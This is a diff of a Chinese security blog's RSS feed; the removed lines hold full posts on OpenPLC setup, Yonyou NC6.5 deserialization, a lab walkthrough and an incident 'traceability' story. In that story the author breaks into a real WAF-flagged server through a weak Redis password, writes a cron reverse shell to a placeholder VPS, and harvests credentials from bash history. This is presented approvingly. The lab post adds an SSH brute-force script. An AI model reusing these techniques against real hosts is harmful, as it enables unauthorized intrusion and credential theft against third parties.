-&lt;p&gt;&lt;strong&gt;作用为本地PLC程序调试使用，无需求可跳过&lt;/strong&gt;&lt;/p&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ git clone https://github.com/thiagoralves/OpenPLC_Editor.git
-$ cd OpenPLC_Editor
-$ ./install.sh
-$ ./openplc_editor.sh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;-openplc-programs&quot;&gt;# &lt;em&gt;OpenPLC Programs&lt;/em&gt;&lt;/h4&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ curl -o openplc_test.st https://raw.githubusercontent.com/sxd0216/openplc_test.st/master/openplc_test.st
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/OpenPLC_TODO1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&quot;-kingview-on-windows&quot;&gt;# &lt;em&gt;Kingview on Windows&lt;/em&gt;&lt;/h4&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;设备驱动 -&amp;gt; PLC -&amp;gt; 莫迪康 -&amp;gt; ModBUS TCP -&amp;gt; TCP -&amp;gt; 下一步：&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/KingView_OPENPLC_TODO.png&quot; alt=&quot;KingView_OPENPLC_TODO&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;文件 -&amp;gt; 画面 添加组件（可参考动图添加组件）&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;数据库 -&amp;gt; 数据字典 -&amp;gt; 新建…&lt;/p&gt;
-    &lt;ul&gt;
-      &lt;li&gt;&lt;img src=&quot;/assets/img/blog/2021/KingView_OPENPLC_TODO2.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;选中自定义画面 -&amp;gt; make -&amp;gt; view （GIF动画有点大，loading…）：&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/KingView_OPENPLC_success.gif&quot; alt=&quot;success.gif&quot; /&gt;&lt;/p&gt;
-</description>
-        <pubDate>Fri, 07 May 2021 00:00:00 +0800</pubDate>
+  OpenPLC环境搭建
+    
+      点击以了解OpenPLC
+    ...</description>
+        <pubDate></pubDate>
         <link> https://www.sentrylab.cn/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/</link>
         <guid isPermaLink="true">/blog/2021/Realization-of-Openplc-simulation-communication-based-on-Modbus-protocol-and-KingView-I/</guid>
         
@@ -441,41 +113,13 @@ $ ./openplc_editor.sh
     
       <item>
         <title>blog: [UPDATING...]用友NC6.5java反序列化</title>
-        <description>&lt;h2 id=&quot;零用友nc65反序列化依赖jar包&quot;&gt;零：用友nc6.5反序列化依赖jar包&lt;/h2&gt;
+        <description>零：用友nc6.5反序列化依赖jar包
 
-&lt;ul&gt;
-  &lt;li&gt;部分依赖jar包在安装完nc6.5系统后，一般在&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;C://yonyou//home//lib//&lt;/code&gt;目录下，前提需要有nc6.5的安装包；或者下载仓库内的依赖包：
-    &lt;ul&gt;
-      &lt;li&gt;&lt;em&gt;&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/README.MD&quot;&gt;点击以了解yonyou-nc6.5-lib&lt;/a&gt;&lt;/em&gt;
-        &lt;ul&gt;
-          &lt;li&gt;本机运行环境&lt;/li&gt;
-        &lt;/ul&gt;
 
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  java version &quot;1.8.0_181&quot;
-  Java(TM) SE Runtime Environment (build 1.8.0_181-b13)
-  Java HotSpot(TM) 64-Bit Server VM (build 25.181-b13, mixed mode)
-
-  javac 1.8.0_181
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;学习教程&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/README.MD&quot;&gt;&lt;em&gt;README&lt;/em&gt;&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;0x01下载&quot;&gt;0x01：下载&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;单jar包：点击&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/blob/master/yonyou-nc6.5-lib/ncdepend.jar&quot;&gt;&lt;em&gt;ncdepend.jar&lt;/em&gt;&lt;/a&gt;链接 -&amp;gt; Download.&lt;/li&gt;
-  &lt;li&gt;整包&lt;a href=&quot;https://github.com/Bin4xin/bigger-than-bigger/releases/tag/yonyou-ncv6.5&quot;&gt;&lt;em&gt;yonyou-NCv6.5-lib.zip&lt;/em&gt;&lt;/a&gt;链接 -&amp;gt; 单击链接下载&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[anonymous] DEBUG  - Invoke nc.bs.framework.server.RemoteMetaContext.lookup write info to server spend time: 188 
-Exception in thread &quot;main&quot; nc.bs.framework.exception.FrameworkIOException: Remote request error
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-</description>
-        <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
+  部分依赖jar包在安装完nc6.5系统后，一般在C://yonyou//home//lib//目录下，前提需要有nc6.5的安装包；或者下载仓库内的依赖包：
+    
+      点击以...</description>
+        <pubDate></pubDate>
         <link> https://www.sentrylab.cn/blog/2021/yonyou-nc6.5-java-underser/</link>
         <guid isPermaLink="true">/blog/2021/yonyou-nc6.5-java-underser/</guid>
         
@@ -488,253 +132,18 @@ Exception in thread &quot;main&quot; nc.bs.framework.exception.FrameworkIOExcept
     
       <item>
         <title>blog: CST 2021年 4月14日 星期三：一次朔源事件的记录</title>
-        <description>&lt;h3&gt;&lt;em&gt;《Bin4xin：我的网安从业朔源事件记录》&lt;/em&gt;&lt;/h3&gt;
+        <description>《Bin4xin：我的网安从业朔源事件记录》
 
-&lt;h3 id=&quot;零起源&quot;&gt;零：起源&lt;/h3&gt;
+零：起源
 
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;p&gt;&lt;em&gt;一日，某护网红队支撑群里发了一份朔源报告，鸦雀无声&lt;/em&gt;&lt;/p&gt;
 
-    &lt;ul&gt;
-      &lt;li&gt;
-        &lt;p&gt;甲方：小伙伴们接集团要求需对 &lt;em&gt;WAF全流量平台&lt;/em&gt; 攻击ip进行朔源…&lt;/p&gt;
+  
+    一日，某护网红队支撑群里发了一份朔源报告，鸦雀无声
 
-        &lt;ul&gt;
-          &lt;li&gt;废佬：这…（甲方你真可爱）&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;领导1：溯源到攻击端信息是个新的领域，望小伙伴们通过此次集团安排做些尝试性学习和探索，
-  落实外部可借力工具和资源，&lt;a href=&quot;https://www.github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;[@Bin4xin废佬]&lt;/a&gt;也加入此次探索学习中。&lt;/p&gt;
-
-        &lt;ul&gt;
-          &lt;li&gt;废佬：这…（领导你真可爱）&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;
-        &lt;p&gt;领导2：&lt;em&gt;文件：《全流量、WAF4月8日-4月12日攻击IP(1).xlsx》&lt;/em&gt;&lt;/p&gt;
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv    
-223.214.211.46
-36.59.38.115
-        
-$ more 全流量、WAF4月8日-4月12日攻击IP\(1\).csv|wc -l
-16570
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
-        &lt;ul&gt;
-          &lt;li&gt;废佬：这…（领导你真可爱）&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;于是废佬就开始了愉快 &lt;em&gt;boring&lt;/em&gt; 的朔源之旅&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;一上午欢乐时光--fofa安全工程师&quot;&gt;一：上午、欢乐时光 &amp;amp; fofa安全工程师&lt;/h3&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;鲁迅：&lt;/p&gt;
-
-  &lt;p&gt;不会朔源的fofa安全工程师不是一个好的信息安全工程师&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;h4 id=&quot;-1x01awksplit--linux&quot;&gt;# 1x01：awk、split &amp;amp; linux&lt;/h4&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;步入主题之前，先对这些文件进行一些简单的操作：
-    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ split -l 300 全流量、WAF4月8日-4月12日攻击IP\(1\).csv ips_preview_by300_
-  $ cat ips_preview_by300_aa|wc -l                     
-     300
-  $ ll
-    total 1400
-    drwxr-xr-x  59 bin4xin  staff    1888  4 14 20:48 ./
-    drwxr-xr-x+ 43 bin4xin  staff    1376  4 14 20:45 ../
-    -rw-r--r--   1 bin4xin  staff    4548  4 14 20:48 ips_preview_by300_aa
-    -rw-r--r--   1 bin4xin  staff    4457  4 14 20:48 ips_preview_by300_ab
-    -rw-r--r--   1 bin4xin  staff    4481  4 14 20:48 ips_preview_by300_ac
-    ··· 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-    &lt;p&gt;这样我们就有了若干个300行ip的小文件，更方便我们筛选我们需要的ip，NEXT。&lt;/p&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;just fofa：&lt;/p&gt;
-
-    &lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/emergency-response-and-traceability-by-fofa.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;-1x02something-interesting&quot;&gt;# 1x02：Something Interesting&lt;/h4&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;em&gt;点击以了解 &lt;a href=&quot;https://fofa.so/&quot; target=&quot;_blank&quot;&gt;fofa安全工程师们&lt;/a&gt; 与 &lt;a href=&quot;https://x.threatbook.cn/&quot; target=&quot;_blank&quot;&gt;微步安全工程师们&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img align=&quot;left&quot; src=&quot;https://x.threatbook.cn/public/img/logo-in-header.882f692c.png&quot; height=&quot;30%&quot; width=&quot;50%&quot; /&gt;
-&lt;img align=&quot;right&quot; src=&quot;https://fofa.so/_nuxt/img/logo.d9ee5c4.png&quot; height=&quot;30%&quot; width=&quot;50%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;欢乐而又短暂的上午如白驹过隙，一晃而过。&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;二下午枯燥时光--渗透测试工程师&quot;&gt;二：下午、枯燥时光 &amp;amp; 渗透测试工程师&lt;/h3&gt;
-
-&lt;h4 id=&quot;-2x01nmapnc--linux-shell&quot;&gt;# 2x01：nmap、nc &amp;amp; linux shell&lt;/h4&gt;
-
-&lt;p&gt;终于：发现了一些有趣的：&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE  SERVICE         VERSION
-22/tcp   open   ssh             OpenSSH 6.6.1 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 fe:03:b9:0b:7b:ab:3f:bf:cd:60:93:57:52:4e:a6:c5 (RSA)
-|   256 9d:97:b5:fb:db:92:ed:a7:e3:dd:f9:5f:86:b5:e3:b4 (ECDSA)
-|_  256 7b:65:cf:48:84:15:82:ca:be:46:3c:cf:93:63:07:f1 (ED25519)
-80/tcp   open   http            nginx
-| http-ls: Volume /
-| SIZE  TIME               FILENAME
-| -     24-Feb-2021 13:21  admin/
-| -     24-Feb-2021 09:27  redis/
-| -     24-Aug-2017 04:55  staragent/
-| -     24-Feb-2021 08:44  www/
-| -     24-Feb-2021 08:44  www/htdocs/
-| -     13-Apr-2021 19:44  www/logs/
-|_
-| http-methods: 
-|_  Supported Methods: GET HEAD POST
-|_http-title: Index of /
-888/tcp  open   http            nginx
-| http-methods: 
-|_  Supported Methods: GET HEAD POST
-|_http-title: 404 Not Found
-3306/tcp open   mysql           MySQL 5.5.62-log
-6379/tcp open   redis           Redis key-value store
-8080/tcp open   http            Apache Tomcat 8.5.63
-|_http-favicon: Apache Tomcat
-| http-methods: 
-|_  Supported Methods: GET HEAD POST
-|_http-title: Apache Tomcat/8.5.63
-8888/tcp open   http            Ajenti http control panel
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;事实上：这是一个宝塔面板，&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8888+888&lt;/code&gt;端口；&lt;/li&gt;
-  &lt;li&gt;另一个事实是：这个被WAF报成&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4月8日-4月12日攻击IP&lt;/code&gt;的IP， &lt;em&gt;mysql &amp;amp; redis&lt;/em&gt; 均为弱口令。
-    &lt;ul&gt;
-      &lt;li&gt;&lt;em&gt;&lt;a href=&quot;https://xz.aliyun.com/t/8018#toc-8&quot; target=&quot;_blank&quot;&gt;点击更多以了解redis渗透&lt;/a&gt;&lt;/em&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./redis-cli -h redis_target_ip           
-redis_target_ip:6379&amp;gt; get key
-(error) NOAUTH Authentication required.
-redis_target_ip:6379&amp;gt; 
-redis_target_ip:6379&amp;gt; auth 123456
-OK
-redis_target_ip:6379&amp;gt; get key
-(nil)
-redis_target_ip:6379&amp;gt; set  xx   &quot;\n* * * * * bash -i &amp;gt;&amp;amp; /dev/tcp/your_vps_target/port 0&amp;gt;&amp;amp;1\n&quot;
-OK
-redis_target_ip:6379&amp;gt; config set dir /var/spool/cron/
-OK
-redis_target_ip:6379&amp;gt; config set dbfilename root
-OK
-redis_target_ip:6379&amp;gt; save
-OK
-redis_target_ip:6379&amp;gt; quit
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h4 id=&quot;-2x02bashinformation-gathering--traceability-incident&quot;&gt;# 2x02：bash、Information gathering &amp;amp; Traceability incident&lt;/h4&gt;
-
-&lt;p&gt;于是我们通过上面步骤获得了服务器权限；&lt;em&gt;awesome ? next more awesome.&lt;/em&gt;&lt;/p&gt;
-
-&lt;p&gt;通过在服务器的信息搜集，似乎看到了19年刚刚接触服务器的自己，没有任何嘲讽的意思，所有人都是初学者过来的；&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;&lt;strong&gt;NO OFFENCE:-)Thanks&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;更加了解linux和linux面板，否则就会显得十分业余，不管你是Development, operation and maintenance or security practitioners；
-    &lt;ul&gt;
-      &lt;li&gt;匮乏的linux知识导致的过多ssh连接：
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  ps -ef|grep ssh|wc -l
-  50
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;错乱的终端与数据库命令运行：
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ cat /home/admin/.bash_history 
-  sudo grep wordpress_admin_passwd /root/env.txt
-  /usr/local/mysql/bin/mysql -u root -p123456
-  sudo su rooe
-  sudo su root
-  sudo grep mysql_root_passwd /root/env.txt
-  mysql
-  alias mysql=/usr/local/mysql/bin/mysql
-  mysql
-  find / -name mysql.sock
-  sudo grep mysql_root_passwd /root/env.txt
-  msyql
-  sudo su root
-  grant all privileges on *.* to 'root'@'%' identified by 'pass-hidden';
-  grant all privileges on *.* to 'root'@'%' identified by '123456';
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
-      &lt;/li&gt;
-      &lt;li&gt;错误的linux权限分配：
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ ps -ef|grep root
-  root      7963     1  0 Mar06 ?        00:39:39 /usr/bin/java -Djava.util.logging.config.file=/www/server/apache-tomcat-8.5.63/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /www/server/apache-tomcat-8.5.63/bin/bootstrap.jar:/www/server/apache-tomcat-8.5.63/bin/tomcat-juli.jar -Dcatalina.base=/www/server/apache-tomcat-8.5.63 -Dcatalina.home=/www/server/apache-tomcat-8.5.63 -Djava.io.tmpdir=/www/server/apache-tomcat-8.5.63/temp org.apache.catalina.startup.Bootstrap start
-  root     23017     1  0 Mar06 ?        00:00:00 nginx: master process nginx -c conf/nginx.conf
-  root     27803     1  0 Feb25 ?        01:17:18 ./redis-server *:6379
-  ···
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;同样的：通过history找到面板管理密码；
-    &lt;ul&gt;
-      &lt;li&gt;tools.py form BT panel：
-        &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;  $ cat /root/.bash_history |grep tools
-  cd /www/server/panel &amp;amp;&amp;amp; python tools.py panel pass-hidden
-  $ cat /www/server/panel/tools.py
-        
-  if __name__ == &quot;__main__&quot;:
-      type = sys.argv[1]
-      if type == 'root':
-          set_mysql_root(sys.argv[2])
-      elif type == 'panel':
-          set_panel_pwd(sys.argv[2])
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;        &lt;/div&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;所以，panel模式下对应的是面板密码设置；&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/blog/2021/stupid-bt-panel-control-pic.png&quot; alt=&quot;&quot; /&gt;
-至此，我们获得了 &lt;em&gt;root、redis、mysql、BT panel&lt;/em&gt; ；而本文并炫技，我们的初衷是朔源：&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;em&gt;mysql&lt;/em&gt;：数据库仅仅是存放论坛系统管理的信息及测试信息；&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;redis&lt;/em&gt;：配合 &lt;em&gt;mysql&lt;/em&gt;，不必多说；&lt;/li&gt;
-  &lt;li&gt;&lt;em&gt;BT panel：www、ftp、sql&lt;/em&gt; 等配置均为简单配置，没有参考价值。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;三总结&quot;&gt;三：总结&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;1、本篇文章的存在意为信息搜集、朔源方向上的抛砖引玉，文笔不佳；&lt;/li&gt;
-  &lt;li&gt;2、结合 &lt;em&gt;# 2x01 及 # 2x02&lt;/em&gt; 小结通篇结束并未发现攻击迹象、痕迹；&lt;/li&gt;
-  &lt;li&gt;3、为何被报为攻击IP不得而知。&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h3 id=&quot;四申明&quot;&gt;四：申明&lt;/h3&gt;
-
-&lt;p&gt;作者：Bin4xin&lt;/p&gt;
-
-&lt;p&gt;转载请申明本文链接：&lt;a href=&quot;/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/&quot; target=&quot;_blank&quot;&gt;《Bin4xin：我的网安从业朔源事件记录》&lt;/a&gt;&lt;/p&gt;
-
-&lt;p&gt;以上。&lt;/p&gt;
-</description>
-        <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
+    
+      
+        甲方：小伙伴们接集团要求需对 WAF全流量平台 攻击ip进行朔源...</description>
+        <pubDate></pubDate>
         <link> https://www.sentrylab.cn/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/</link>
         <guid isPermaLink="true">/blog/2021/Record-a-suffocating-emergency-response-and-traceability-incident/</guid>
         
@@ -751,82 +160,14 @@ redis_target_ip:6379&amp;gt; quit
     
       <item>
         <title>blog: 辛丑·本命年 年后的一些思考</title>
-        <description>&lt;p&gt;过完年回合肥已经接近一个月之久了，今年是本命年，也希望自己能够能够比20年更加努力。回了公司就按照计划忙些有意义的：&lt;/p&gt;
+        <description>过完年回合肥已经接近一个月之久了，今年是本命年，也希望自己能够能够比20年更加努力。回了公司就按照计划忙些有意义的：
 
-&lt;ul&gt;
-  &lt;li&gt;一切正在有条不紊的进行着：&lt;/li&gt;
-&lt;/ul&gt;
 
-&lt;p&gt;按照新年的规划，过来需要沉淀的便是Shiro框架。过完年回来就面临着护网，在20年靠着这个为公司护网“打下了一片江山”，今年应进一步理解；&lt;/p&gt;
+  一切正在有条不紊的进行着：
 
-&lt;p&gt;&lt;strong&gt;说些没用的：&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;过年回来后，忙里偷闲与学校网安实验室的孩子们开了一次线下交流会，交流会的主要内容就是总结寒假以来的学习过程和心得汇报；因为年纪较小，基本都是刚大一、大二，所以偶尔也要进行大学生活困扰的解惑；&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;网安实验室队伍安排：
-    &lt;ul&gt;
-      &lt;li&gt;导师：
-  队伍灵魂；&lt;/li&gt;
-      &lt;li&gt;我的角色：
-  我想，我在这个队伍里扮演的角色应该是作为行业“过来人”对他们的学习计划进行有效的监督和建议。&lt;/li&gt;
-      &lt;li&gt;攻击队伍（红队）要求：
-        &lt;ul&gt;
-          &lt;li&gt;1.熟悉各种漏洞特征和利用原理；&lt;/li&gt;
-          &lt;li&gt;2.能够基本读懂POC代码所进行的操作，并自己有一定的编程能力和代码审计能力；&lt;/li&gt;
-          &lt;li&gt;3.熟悉市面主流WAF的识别、WAF规则探测、绕过以及攻击WAF后的资产。&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;防守队伍（蓝队）要求：
-        &lt;ul&gt;
-          &lt;li&gt;1.熟悉各类漏洞形成原因、及时跟进互联网上爆出的各种0day、1day、Nday，并对频繁爆出漏洞的组件有深刻的理解，如WebLogic反序列化、Shiro反序列化、各种（SQL、模版）注入等等；&lt;/li&gt;
-          &lt;li&gt;2.熟悉主流操作系统Linux、Windows的工作原理如软件编译安装能力、集群的独立运维能力以及安全事件朔源能力；&lt;/li&gt;
-          &lt;li&gt;3.能够做到独立部署安全（审计）平台或安全工具，如WAF以及WAF工作涉及的规则库编写。&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;数据挖掘类，涉及到算法应用等；不多说。&lt;/li&gt;
-      &lt;li&gt;开发类；不多说。&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;现存问题如下：&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;如何在现阶段的网安环境下，打造出一支专业化团队：&lt;br /&gt;
-    |__ 1、网安实验室是否能够成立CTF战队？&lt;br /&gt;
-    |__ 2、企业安全专业化安全服务团队？&lt;br /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;问题1、针对夺旗战队，我想：当下的拥有的资源便是最好的机会：
-    &lt;ul&gt;
-      &lt;li&gt;能够有本专业导师的指导同时，有一定生源来进行夺旗比赛
-        &lt;ul&gt;
-          &lt;li&gt;选取队长来保证战队的凝聚力和团队活力；&lt;/li&gt;
-          &lt;li&gt;管理团队应当采取比赛军事化管理；包括晨跑、内部攻防训练赛&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-      &lt;li&gt;生源的匹配问题：
-        &lt;ul&gt;
-          &lt;li&gt;在生源筛选时存在的问题：
-            &lt;ul&gt;
-              &lt;li&gt;或许在实验室的生源选择中，应当让所有有该行业兴趣的新生都加入进来，我始终相信的是，大学生活是自身兴趣的发掘过程，对他们的培养过程同时也是考核过程；&lt;/li&gt;
-              &lt;li&gt;因为当下存在的问题较为明显。&lt;/li&gt;
-            &lt;/ul&gt;
-          &lt;/li&gt;
-          &lt;li&gt;部分年轻新生，无法在团队的带跑下跟上节奏，踢出；&lt;/li&gt;
-          &lt;li&gt;小部分自身问题产生各种问题&lt;/li&gt;
-        &lt;/ul&gt;
-      &lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-</description>
-        <pubDate>Sat, 13 Mar 2021 00:00:00 +0800</pubDate>
+按照新年的规划，过来需要沉淀的便是Shiro框架。过完年回来就面临着护网，在...</description>
+        <pubDate></pubDate>
         <link> https://www.sentrylab.cn/blog/2021/thereis-something2say/</link>
         <guid isPermaLink="true">/blog/2021/thereis-something2say/</guid>
         
@@ -838,189 +179,98 @@ redis_target_ip:6379&amp;gt; quit
       </item>
     
       <item>
-        <title>blog: GainPower靶场渗透历程</title>
-        <description>&lt;ul&gt;
-  &lt;li&gt;employee1:ssh banner发现问题；
-    &lt;ul&gt;
-      &lt;li&gt;根据提示获得低权限shell&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;employee64:考验脚本编写能力（ssh爆破）
-    &lt;ul&gt;
-      &lt;li&gt;bash脚本批量连接&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;programmer:获取sudo shell
-    &lt;ul&gt;
-      &lt;li&gt;通过unshare切换到sudo用户&lt;/li&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ su - employee64&lt;/code&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$ sudo -u programmer unshare&lt;/code&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;vanshal:crontab计划获取shell
-    &lt;ul&gt;
-      &lt;li&gt;pspy tool to detected&lt;/li&gt;
-      &lt;li&gt;/media/programmer/scripts/backup.sh&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-  &lt;li&gt;root:secert zip file
-    &lt;ul&gt;
-      &lt;li&gt;zip password crack&lt;/li&gt;
-      &lt;li&gt;login ajenti to run root shell.&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;写个脚本来批量跑试试看：&lt;/p&gt;
-&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#!/bin/bash
-
-pwn () {
-  read -p 'target ip: ' ip
-  sleep 2
-  for data in {1..100}
-  do
-      echo 'Try: ' $data
-      sshpass -p 'employee'$data ssh employee$data@$ip 'echo employee'$data' | sudo -S -l'
-      printf &quot;\n&quot;
-  done
-}
-
-pwn
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;for一下用户名密码{employee+$data}in{1..100}，使用sshpass进行批量ssh连接认证，并尝试&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt;;
-失败如下：&lt;/p&gt;
